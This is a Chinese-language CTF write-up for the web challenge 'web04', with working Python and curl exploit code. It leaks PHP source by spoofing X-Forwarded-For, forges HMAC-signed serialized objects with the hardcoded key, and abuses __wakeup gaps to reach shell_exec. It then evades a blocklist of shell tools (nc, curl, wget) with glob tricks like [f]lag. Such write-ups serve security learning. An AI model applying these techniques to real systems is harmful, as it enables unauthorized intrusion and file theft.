# web04 · Northline Route Desk（自研序列化胶囊 + PHP 对象注入 + 命令注入双绕）

| 项 | 值 |
|----|----|
| 轮次 | 环节三（17:00） |
| 平台题目名 | web04 |
| 比赛 qid | agx_XF9JxuV545mS |
| 分类 | web |
| 分值 | 500 |
| 交互型 | true（容器） |
| 关键 flag | `flag{6a414b5e-897a-40c6-9925-26ad77b5d092}` |
| 是否解出 | 已解出 |
| **还原完整度** | **A**（**泄露的完整原始 PHP 源码**逐字节归档为 `deploy/src/index.php`，Dockerfile/compose 可起容器并已实测打通全链） |

## 1. 题面（比赛原文，逐字保留）

> **（平台 description 为空）**

题面为空 —— 本题**没有任何文字提示**，全部信息来自页面与源码泄露。
页面泄露的线索（`index.php` 源码注释 + 页面文案）：

```
<!-- /?audit=1 is reserved for local relay checks -->
Northline Console / Route Desk
Route Target -> 表单提交 node 参数（默认 127.0.0.1）
Switchboard: Probe / Capsule(queued) / Mirror(local)
Manual Channel (stdout) / Replay Channel (deferred)
```

## 2. 附件与环境

| 项 | 内容 |
|----|------|
| 附件 | **无附件**（`file_url` 为空串），纯容器题 |
| 容器 | `https://eci-2ze6xkwkd3bq8xtkkyb1.cloudeci1.ichunqiu.com:9999`（**会随平台 reset 变化**） |
| 附件存放 | `attachments/`（无原始附件，保留 `.gitkeep` 占位） |
| **题目源码** | `deploy/src/index.php`（**18893 B / 658 行，逐字节来自比赛期间通过 `/?audit=1` 泄露的完整源码**） |
| 源码原始取证 | `work/r3_web04/audit_src.php`、`work/r3_web04_src.php`（md5 `3469bdba1dbc6ecbf4426b689a396b69`）、`work/r3_web04_audit.bin`（93687 B 高亮 HTML 原件） |
| 参考利用脚本 | `work/r3_web04_exp.py`（4513 B，比赛期间**完整可跑**） |
| 部署件 | `deploy/`（php:7.4-apache，已实测打通全链） |

## 3. 考点（★核心）

- **考点 1 — 源码泄露：`GET /?audit=1` + `X-Forwarded-For: 127.0.0.1`。**

  ```php
  function request_says_loopback(): bool {
      $header = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? ($_SERVER['HTTP_X_REAL_IP'] ?? '');
      $first  = trim(explode(',', $header)[0]);
      return in_array($first, ['127.0.0.1', '::1'], true);
  }
  if (isset($_GET['audit'])) {
      if (request_says_loopback()) { highlight_file(__FILE__); exit; }
      http_response_code(403);
  }
  ```

  伪造 `X-Forwarded-For: 127.0.0.1` 即可通过"本地中继"校验，把
  `highlight_file(__FILE__)` 的 **93 KB 高亮 PHP 源码**整个回显出来 ——
  **一次性资源**：它是本题唯一的源码获取途径，且**没有次数限制但会打崩容器**；
  拿到源码后 `MATERIAL`（HMAC 密钥）、`COIL`（proof salt）、`MARKER`、
  `allowed_classes` 白名单、黑名单全文全部到手。
- **考点 2 — 自研胶囊协议的"签名包裹"（HMAC over frame）。**

  ```php
  final class LedgerCodec {
      private const MATERIAL = 'ravel::ledger::2026::7c2a0e49b5';   // ★ 硬编码在源码里
      public static function wrap(string $message): string {
          $frame = rtrim(strtr(base64_encode(gzcompress($message, 9)), '+/', '._'), '=');
          $tag   = substr(hash_hmac('sha384', $frame, self::MATERIAL), 11, 32);
          return $frame . '~' . $tag;
      }
      public static function unwrap(string $ticket): ?string {
          if (!preg_match('/^[A-Za-z0-9._]{24,4200}~[a-f0-9]{32}$/', $ticket)) return null;
          [$frame, $tag] = explode('~', $ticket, 2);
          $expected = substr(hash_hmac('sha384', $frame, self::MATERIAL), 11, 32);
          if (!hash_equals($expected, $tag)) return null;
          $padding = strlen($frame) % 4;
          if ($padding !== 0) $frame .= str_repeat('=', 4 - $padding);
          $packed = base64_decode(strtr($frame, '._', '+/'), true);
          if ($packed === false) return null;
          $message = @gzuncompress($packed, 8192);
          return is_string($message) ? $message : null;
      }
  }
  ```

  攻击者需要复刻的精确细节：
  `frame = base64(gzcompress($payload, 9))` → **`rtrim('=')`** → **`+`→`.`、`/`→`_`**（URL-safe 变体）；
  `tag = substr(hmac_sha384(frame, MATERIAL), 11, 32)`（**偏移 11、取 32 位 hex**）；
  `ticket = frame + '~' + tag`，放进 **cookie `RAVEL_LEDGER`**，
  并且必须带请求头 **`X-RAVEL-PHASE: replay`**（否则只提示
  `A packed ledger capsule is queued, but replay phase is not enabled.`）。
  **HMAC 密钥硬编码在源码中** ⇒ 拿到源码 = 可以给自己伪造的任意对象合法签名。
- **考点 3 — 自研反序列化的"字段净化不完整"（`__wakeup` 漏字段）。**

  ```php
  public function __wakeup(): void {
      if (!$this->rule instanceof LoopbackRule) $this->rule = new LoopbackRule();
      if (!$this->courier instanceof CourierEngine) $this->courier = new CourierEngine();
      $this->sanitizeNode();
  }
  public function __destruct(): void {
      if ($this->primed !== true) return;                                    // ← 未重置
      if (!is_string($this->marker) || !hash_equals(self::MARKER, $this->marker)) { ... } // ← 未重置
      if (!$this->rule->accepts($this->node)) { ... }
      self::$deferredReport = $this->courier->launch($this->node);
  }
  ```

  `__wakeup()` 只重置不合规的 `rule` / `courier`，**漏掉了 `primed` / `marker` / `node`**
  （`node` 只做 `sanitizeNode()` 正则清洗，`127.0.0.1` 合法通过）。
  攻击者只要把这三个字段"填成合规值"（`primed=true`、`marker='ledger-route:slot-8'`、
  `node='127.0.0.1'`）就能让 `__destruct()` 直通 `launch()` ——
  这是典型的"白名单式净化漏字段"。
- **考点 4 — `proof` 是公开算法可自算（不是密钥）。**

  ```php
  private const COIL = 'courier-engine::ravel::route-lock';
  private function makeProof(): string {
      $route = $this->routeName . '#' . $this->launcher . '#' . implode("\x1e", $normalized);
      return substr(hash('sha256', self::COIL . '#' . $route), 5, 26);
  }
  public function launch(string $node): string {
      if (!$this->isReady()) return "courier stopped: route proof mismatch\n";   // hash_equals(makeProof(), proof)
      ...
  }
  ```

  `proof = sha256(COIL + '#' + routeName + '#' + launcher + '#' + args.join("\x1e"))[5:31]`
  其中 `args` 是**字符串化后**用 `\x1e` 连接。攻击者拿到源码就能为任意
  `(routeName, launcher, arguments)` 组合算出一致性证明 ⇒ 整个 `isReady()` 校验形同虚设。
- **考点 5 — 命令注入绕过：黑名单"只查部分字段" + `stripos` 子串匹配。**

  ```php
  $rawRoute = $this->launcher . "\n" . implode("\n", $normalized);   // ★ 只含 launcher + arguments
  $blocked = ['ash','bash','dash','zsh','sh','php','perl','python','python3','ruby','lua','node',
              'busybox','nc','ncat','socat','curl','wget','fetch','xxd','base64','od','dd','hexdump',
              'strings','tail','head','more','less','cat','tac','flag','secret','readme',
              'proc','environ','self','$','`','|','&','<','>',';'];
  foreach ($blocked as $needle) if (stripos($rawRoute, $needle) !== false) return "blocked ...";
  $parts   = array_merge([$this->launcher], $normalized);
  $parts[] = $node;                                                  // ★ $node 不进黑名单检查
  $command = 'timeout ' . $seconds . ' ' . implode(' ', array_map('escapeshellarg', $parts))
           . ' 2>&1 | /usr/bin/head -c 8192';
  return shell_exec($command) ?? '';
  ```

  两个可利用点：
  1. **黑名单不覆盖 `$node`**：`$node` 被 `escapeshellarg` 包住，所以它不是注入点本身，
     但它**永远追加在命令末尾** —— 这正是 `find / -maxdepth 1 -type f 127.0.0.1` 报
     `paths must precede expression` 的原因（可用来确认命令真的执行了）。
  2. **`stripos` 是子串匹配 + shell 的通配**：`[f]lag` 在 PHP 里**不含**子串 `flag`
     （因为字符是 `[`、`f`、`]`、`l`、`a`、`g`），但到了 shell 里 **glob 展开就是 `flag`**。
     同一个技巧可以写 `[p]roc` 绕 `proc`、`[s]elf` 绕 `self`。
     另外 `escapeshellarg` 不阻止 shell 元字符的**参数内**展开（`[`、`*` 都不是被引号屏蔽的对象，
     它们是被引号包住后由 shell 做 glob 展开的 —— 所以能正常命中文件名）。
- **考点 6 — 路径白名单与参数长度限制的边界（必须绕过的"外围"）。**
  `launcher` 必须匹配 `#^/(usr/)?bin/[a-z0-9][a-z0-9._-]{1,48}$#i`
  ⇒ 只能用 `/usr/bin/<name>` 或 `/bin/<name>` 形态的真实二进制；
  `arguments` 每个 ≤ 104 字节且禁止 `\x00-\x1f\x7f`；`launcher + args` 拼接后 ≤ 960 字节；
  `window` 被 `max(1, min(6, ...))` 夹紧 ⇒ 超时最多 6 秒（因此"扫全盘"必须靠
  `--exclude-dir` 缩小范围，否则会被 timeout 掉）。

## 4. 设计思路（★核心）

- **为什么这样出**：这是一道**"源码给你了，你也能读懂，但链子必须五段全对"**的题。
  出题人把"自研协议"的三层（压缩+b64 变体、HMAC over frame、偏移截断的 tag）
  与"反序列化净化"（`__wakeup` 漏字段）与"命令注入"（黑名单漏字段 + 子串匹配）
  叠在一起，考察的是**照源码精确复刻**的能力，而不是灵光一现。
- **难度卡点设计在哪**：
  1. **协议复刻的位级精度**：`rtrim('=')`、`+→.`/`/→_`、`substr(hmac, 11, 32)`、
     `gzcompress($m, 9)`、`X-RAVEL-PHASE: replay` —— 任何一处差一个字符，
     `unwrap()` 直接返回 `null`，页面只会说 `ledger refused: damaged capsule`，
     **不给你任何调试信息**。
  2. **`proof` 必须与 `launcher`/`arguments` 完全一致**：`makeProof()` 会把
     `arguments` 里每个元素**字符串化**再用 `\x1e` 连接。数组成员若写成非字符串
     （如整数 `2`），序列化与 PHP 端 `(string)` 转换必须对齐，否则 `hash_equals` 失败，
     页面只说 `courier stopped: route proof mismatch`。
  3. **黑名单的正确绕法只有一条路**：不能用 `cat`（被禁）、不能用 `|`/`;`/`&`（被禁）、
     不能用 `$`/反引号（被禁）。唯一出路是**找一个"能读文件且名字不在黑名单里"的现成二进制**
     —— `grep` 不在黑名单里（`/usr/bin/grep`），于是
     `grep -r -I -m1 --exclude-dir=... '[f]lag' /` 一步到位。
- **干扰项 / 诱导项**：
  1. **`/?audit=1` 是"会打崩容器的一次性资源"** —— 这是本题最大的陷阱。
     源码注释写着 `reserved for local relay checks`，一旦你反复打它（比如"再确认一次源码"），
     容器会被 `highlight_file` 的 93 KB 输出压垮/超时，接着你就失去了整个靶场。
     正确做法：**先列需求清单（要哪些常量），只打一次，落地存盘**。
     本题的完整源码就是这么拿到的（`work/r3_web04_audit.bin`，93687 B）。
  2. **`/secret` 式的直接读**：页面只有 `node` 一个输入框 + `Probe` 按钮，
     `GET /?node=...` 会走 `probeNow()` → `LoopbackRule::accepts()` 只允许
     `127.0.0.1`/`::1`，且 `CourierEngine` 默认 `launcher=/usr/bin/timeout`、
     `arguments=['2','/usr/bin/true']`，**跑出来的永远是空输出**
     —— 诱导你以为"参数注入点在 `node`"，从而在 `node` 上做无用的路径穿越/命令拼接。
     真正的注入点在**加密胶囊（cookie）**里。
  3. **`blocked` 黑名单里放了一堆看起来"很危险"的词**（`cat`/`head`/`tail`/`strings`/`xxd`/
     `base64`/`nc`/`curl`/`wget`），诱导你去想"怎么把文件内容外带"；
     其实 `grep` 本身就能回显文件内容，根本不需要外带。
     黑名单里还塞了 `sh` 这个两字符词 —— 它会**顺带**命中 `bash`/`dash`/`zsh`/`ash`，
     看起来滴水不漏，唯独漏了 `grep`/`find`/`sort`/`awk`/`sed` 这些"非 shell"工具。
  4. **`escapeshellarg` + `timeout` + `head -c 8192` 的三重包装**看起来像"注入已经被防住"：
     参数确实被引号包住、超时被夹到 ≤6 秒、输出被截到 8 KB。但注入不靠逃出引号，
     而靠 **glob 展开**（`[f]lag`）—— 引号内照样展开。
- **哪些地方是"必须踩坑才会发现"的**：
  - **必须先泄露源码**，否则 `MATERIAL`/`COIL`/`MARKER`/`allowed_classes` 一个都拿不到。
  - **必须发现 `__wakeup` 漏字段**：只"随便构造一个 `LedgerJob`"会在
    `if ($this->primed !== true) return;` 处静默返回，页面什么都不显示
    （`$deferredReport` 为空 → 不渲染 Replay Channel）。
  - **必须算对 `proof`**：算错 → `courier stopped: route proof mismatch`。
  - **必须用 `[f]lag` 而不是 `flag`**：直接写 `flag` 会被 `stripos` 命中并
    返回 `courier stopped: blocked route token flag`。
  - **必须用 `--exclude-dir` 缩小范围**：`window` 最大 6 秒，全盘 `grep -r /` 会被
    `timeout` 杀掉，回显为空。排除 18 个目录后 6 秒内能扫完根目录。

## 5. 解题路径（按真实过程，分步骤）

1. **侦察**：确认站点与两个输入面（`node` 参数 + `RAVEL_LEDGER` cookie）。

   ```bash
   curl -s "https://<容器>:9999/" | head -40
   # 页面注释：<!-- /?audit=1 is reserved for local relay checks -->
   curl -s "https://<容器>:9999/?node=127.0.0.1"      # Probe：正常但无输出
   curl -s "https://<容器>:9999/?node=127.0.0.1;id"   # 注入 node 无效
   ```

2. **突破 ①：泄露源码（只打一次！）**

   ```bash
   curl -s -H 'X-Forwarded-For: 127.0.0.1' "https://<容器>:9999/?audit=1" -o audit.bin
   # -> 93687 B 的高亮 PHP 源码；提取后得到 658 行原始 index.php
   ```

   从中抄出四个关键常量（这是**后续一切的前提**）：

   ```
   MATERIAL = 'ravel::ledger::2026::7c2a0e49b5'         # HMAC 密钥
   COIL     = 'courier-engine::ravel::route-lock'        # proof salt
   MARKER   = 'ledger-route:slot-8'                      # __destruct 检查的 marker
   allowed_classes = ['LedgerJob','LoopbackRule','CourierEngine']
   ```

3. **突破 ②：构造并签名胶囊。** 复刻 `wrap()`，三种对象按 private 属性名（`\0类名\0属性`）序列化：

   ```python
   def ps(cls, props, order):
       out = f'O:{len(cls)}:"{cls}":{len(order)}:{{'
       for k in order:
           t, v = props[k]
           name = f'\0{cls}\0{k}'
           out += f's:{len(name.encode())}:"{name}";'
           ...
       return out + '}'

   proof = sha256((COIL + '#' + routeName + '#' + launcher + '#' + '\x1e'.join(args)).encode()).hexdigest()[5:31]
   frame = base64.b64encode(zlib.compress(payload.encode(), 9)).decode().rstrip('=').replace('+', '.').replace('/', '_')
   tag   = hmac.new(MATERIAL.encode(), frame.encode(), hashlib.sha384).hexdigest()[11:43]
   ticket = frame + '~' + tag
   ```

4. **突破 ③：带上 replay 头投递。**

   ```bash
   curl -s -H 'X-RAVEL-PHASE: replay' -H "Cookie: RAVEL_LEDGER=$ticket" "https://<容器>:9999/"
   ```

   排错用的"回显 ⇒ 病因"对照表（实测语义）：

   | 页面回显 | 病因 |
   |----------|------|
   | `ledger refused: damaged capsule` | frame/tag 格式或 HMAC 不对（协议复刻有错） |
   | `ledger refused: unexpected capsule type` | 反序列化出来的不是 `LedgerJob` |
   | `A packed ledger capsule is queued, but replay phase is not enabled.` | 漏了 `X-RAVEL-PHASE: replay` |
   | （Replay Channel 完全不渲染） | `primed !== true` 或 cookie 名写错 |
   | `ledger refused: marker mismatch` | `marker` 不等于 `ledger-route:slot-8` |
   | `ledger refused: node outside loopback charter` | `node` 不是 `127.0.0.1`/`::1` |
   | `courier stopped: route proof mismatch` | `proof` 与 `(routeName,launcher,args)` 不匹配 |
   | `courier stopped: blocked route token <词>` | 黑名单命中，**该词要改成 `[x]yz` 形态** |
   | `courier stopped: launcher outside route map` | `launcher` 不匹配 `^/(usr/)?bin/[a-z0-9][a-z0-9._-]{1,48}$` |

5. **突破 ④：命令注入取 flag。**

   ```python
   EXCLUDE = ['--exclude-dir=[%s]%s' % (d[0], d[1:]) for d in
              ['etc','usr','var','bin','sbin','lib','proc','sys','dev','run',
               'opt','home','root','tmp','mnt','media','srv','boot']]
   launcher = '/usr/bin/grep'
   args     = ['-r', '-I', '-m1'] + EXCLUDE + ['[f]lag', '/']
   ```

   回显：

   ```
   /flag:flag{6a414b5e-897a-40c6-9925-26ad77b5d092}
   /usr/bin/grep: 127.0.0.1: No such file or directory      <- $node 被追加到末尾的痕迹
   ```

## 6. 参考解法（代码）

```python
# solve/solve.py 核心（完整可跑，参数化 --target）

def make_proof(route, launcher, args):
    """考点 4：proof 是公开算法，可自算"""
    route_str = route + '#' + launcher + '#' + '\x1e'.join(str(a) for a in args)
    return hashlib.sha256((COIL + '#' + route_str).encode()).hexdigest()[5:5 + 26]

def build_job(launcher, args, route='echo-probe', window=4, node='127.0.0.1'):
    """考点 3：把 primed/marker/rule/courier/node 全部污染成合规值"""
    proof = make_proof(route, launcher, args)
    courier = ps('CourierEngine', {'routeName': ('s', route), 'launcher': ('s', launcher),
                                   'arguments': ('a', args), 'window': ('i', window),
                                   'proof': ('s', proof)},
                 ['routeName', 'launcher', 'arguments', 'window', 'proof'])
    rule = ps('LoopbackRule', {'expression': ('s', r'/^(::1|127(?:\.[0-9]{1,3}){3})$/i'),
                               'strategy': ('s', 'regexp')}, ['expression', 'strategy'])
    return ps('LedgerJob', {'primed': ('b', True), 'marker': ('s', MARKER),
                            'rule': ('o', rule), 'courier': ('o', courier),
                            'node': ('s', node)},
              ['primed', 'marker', 'rule', 'courier', 'node'])

def wrap(payload):
    """考点 2：复刻 LedgerCodec::wrap()"""
    frame = base64.b64encode(zlib.compress(payload.encode(), 9)).decode()
    frame = frame.rstrip('=').replace('+', '.').replace('/', '_')
    tag = hmac.new(MATERIAL.encode(), frame.encode(), hashlib.sha384).hexdigest()[11:11 + 32]
    return frame + '~' + tag

# 考点 5/6：grep 不在黑名单里；[f]lag 绕 stripos 子串匹配；--exclude-dir 压进 6 秒
EXCLUDE = ['--exclude-dir=[%s]%s' % (d[0], d[1:]) for d in
           ['etc','usr','var','bin','sbin','lib','proc','sys','dev','run',
            'opt','home','root','tmp','mnt','media','srv','boot']]
fire(target, '/usr/bin/grep', ['-r', '-I', '-m1'] + EXCLUDE + ['[f]lag', '/'], 'grep-root')
```

参见 `solve/solve.py`（含 `--leak-source`、回显解析、`<pre>` 区块提取与 JSON 输出）。

## 7. Flag 与验证记录

| 项 | 值 |
|----|----|
| flag | `flag{6a414b5e-897a-40c6-9925-26ad77b5d092}` |
| 提交接口返回 | `code=0`，`status=null`，`message="恭喜您，回答正确"`，`pass=true`（题目 `is_solved` 变为 true） |
| 提交时间 | 2026-09-14 17:07:56 |
| 提交接口 | `/ff874ef3172cbf4fd6ec2c5653a568e2?token=&question_id=agx_XF9JxuV545mS&answer=<flag>` |
| 证据文件 | `work/submit_results_live.json` 内该 qid 的回执；完整源码 `work/r3_web04_audit.bin`；利用脚本 `work/r3_web04_exp.py` |
| 附近的一次无效提交 | 17:05:33 `qid="-outputFormat"` → `101 缺少参数`（PowerShell 把 `--outputFormat xml` 当成了位置参数，属操作事故，非题目问题） |

## 8. 还原说明（诚实写）

- **已有原始件**：
  - **完整原始 PHP 源码**（这是本题最强的还原资产）：比赛期间通过
    `GET /?audit=1` + `X-Forwarded-For: 127.0.0.1` 让靶机 `highlight_file(__FILE__)`，
    拿到 93687 B 的高亮 HTML（`work/r3_web04_audit.bin`）。
    去掉 `<span>`/`<br />` 高亮标签后得到 18893 B / 658 行的原始 `index.php`
    （`work/r3_web04/audit_src.php`、`work/r3_web04_src.php`，md5 `3469bdba1dbc6ecbf4426b689a396b69`）。
    本目录 `deploy/src/index.php` 就是它**逐字节复制**（仅去掉了 audit 回显开头的空行 ——
    因为 `declare(strict_types=1)` 必须是文件第一条语句，留着那个空行会让 PHP 直接
    `Fatal error: strict_types declaration must be the very first statement`）。
  - 题面（平台 description 为空）、容器地址、flag、平台回执。
  - 参考利用脚本 `work/r3_web04_exp.py`（4513 B，比赛期间完整可跑）。
- **重建部分**：
  - `deploy/Dockerfile` + `docker-compose.yml`：容器题原本只给了个 URL，部署件全部重建。
    已实测**逐条还原原题的两处环境坑**：
    ① `php:7.4-apache` **默认没有 `grep`**（而利用链正需要 `/usr/bin/grep`）→ 装 `grep`；
    ② Debian 11 是 usrmerge，`grep` 落在 `/bin/grep` 而 `/usr/bin/grep` 不存在，
    但原题 `launcher` 写的就是 `/usr/bin/grep` → **补符号链接对齐**，
    使 README 记录的原始 payload 可以原样跑通。
  - `deploy/flag`：复现用 flag（`/flag`，权限 444，与原题一致）。
- **未能还原**：
  - 比赛容器的精确基础镜像（PHP 版本/Apache 版本）。本题源码不依赖 PHP 8 特性，
    `php:7.4-apache` 与 `php:8-apache` 都能跑；本地实测用 7.4。
  - `/?audit=1` 打崩容器的**具体崩溃机制**（是 OOM、是 Apache worker 打满、
    还是 gzip 后的大小问题）—— 比赛期间只观察到"多次请求后容器不可用"，
    未做崩溃复现。这一点在 README 里作为"陷阱"提示，不作为可复现的环境事实。
- **可复现性验证**（已实测，全链打通）：

  ```text
  [*] baseline / -> 200 len=9105                       # 页面正常
  === 2) 命令注入：grep -r 扫根目录找 flag ===
    [grep-root] 200 len=9444
     --- <pre>#1 ---
     /flag:flag{local-r3-web04-ravel-ledger-courier-rce}
     /usr/bin/grep: 127.0.0.1: No such file or directory
  [+] FLAG = flag{local-r3-web04-ravel-ledger-courier-rce}
  ```

  自检链的完整性由**回显文本**逐段证明（每一段都对应一个考点）：
  - 页面 200 + 9105 B ⇒ 站点活着（考点 0）
  - 没有 `ledger refused: damaged capsule` ⇒ HMAC + frame 格式正确（考点 2）
  - 没有 `marker mismatch` / `node outside loopback charter` ⇒ 考点 3 的字段污染正确
  - 没有 `route proof mismatch` ⇒ 考点 4 的 proof 自算正确
  - 没有 `blocked route token` ⇒ `[f]lag` 成功绕过 `stripos`（考点 5）
  - 回显含 `/flag:flag{...}` ⇒ 命令真的执行并读到文件；末尾
    `/usr/bin/grep: 127.0.0.1: No such file or directory` 正是
    `$node` 被追加到命令末尾的证据（考点 5 的"漏字段"）

  另附 `--leak-source` 路径的验证（本地只打一次）：返回 200 + 18893 B 级别的源码回显。

## 9. 复现步骤

```bash
cd timu/round3_1700/web04

# ① 起容器（本地映射端口 9999）
docker compose -f deploy/docker-compose.yml up -d --build

# ② 打靶（RCE 取 flag）
python solve/solve.py --target http://127.0.0.1:9999
# -> [+] FLAG = flag{local-r3-web04-ravel-ledger-courier-rce}
#    [+] 取得方式: RCE: /usr/bin/grep -r -I -m1 --exclude-dir=... [f]lag /

# ③ 可选：验证源码泄露路径（⚠️ 只打一次）
python solve/solve.py --target http://127.0.0.1:9999 --leak-source
# 本地复现无所谓（每次 up 都是干净容器），比赛环境请只打一次

# ④ 收工
docker compose -f deploy/docker-compose.yml down -v
```

> 复现要点三条：
> ① **容器里必须有 `/usr/bin/grep`**（`Dockerfile` 已装 `grep` 并补了
> `/usr/bin/grep -> /bin/grep` 符号链接）—— 否则题目无解（原题正是这个路径）。
> ② **`deploy/src/index.php` 不要改一个字节**（除 audit 开头空行），
> 所有常量都从它里面读；改了就破坏"源码泄露"这一考点的忠实度。
> ③ **`/?audit=1` 是本地可重复、比赛环境一次性的**（会打崩容器）。
